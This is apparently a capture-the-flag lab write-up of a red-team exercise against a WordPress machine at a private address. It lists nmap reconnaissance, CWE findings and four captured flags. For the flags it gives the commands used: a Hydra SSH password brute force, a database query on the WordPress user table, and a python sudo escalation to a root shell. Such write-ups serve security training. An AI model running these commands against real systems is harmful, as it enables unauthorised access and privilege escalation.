# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

nmap -sT -A -p- -Pn -T4 --reason -oA host-1-scan 192.168.1.110

<img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image4.png" width=50% height=50%>

This scan identifies the services below as potential points of entry:
- Target 1
  - SSH
  - HTTP
  - SMB

The following vulnerabilities were identified on each target:

 - CWE-552: Files or Directories Accessible to External Parties

<img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image7.png" width=75% height=75%>
 
 - CWE-521: Weak Password Requirements

<img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image8.png" width=75% height=75%>
 
 - CWE-732: Incorrect Permission Assignment for Critical Resource

<img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image10.png" width=75% height=75%>

 - CWE-269: Improper Privilege Management

<img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image14.png" width=75% height=75%>


### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

   `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
  
   **Exploit Used**
      - Exploit method: Used Hydra to brute force user Michael's password (user: michael pass: michael)
      - Command used: hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.110
  
 
 <img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image8.png" width=75% height=75%>
  
   `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
 
    **Exploit Used**
      - Navigated to webroot without being a privileged user
      - Command used: cd /www/var
 
 
 <img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image5.png" width=75% height=75%>
 
 
   `flag3.txt`: afc01ab56b50591e7dccf93122770cd2

    **Exploit Used**
      - Able to access user table in mySQL database
      - Command used: SELECT * FROM wp_users;


<img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image2.png" width=75% height=75%>


   `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
 
    **Exploit Used**
      - Spawning root shell from python command
      - Command used: python -c 'import os; os.system("/bin/sh")'


<img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image%2020.png" width=75% height=75%>
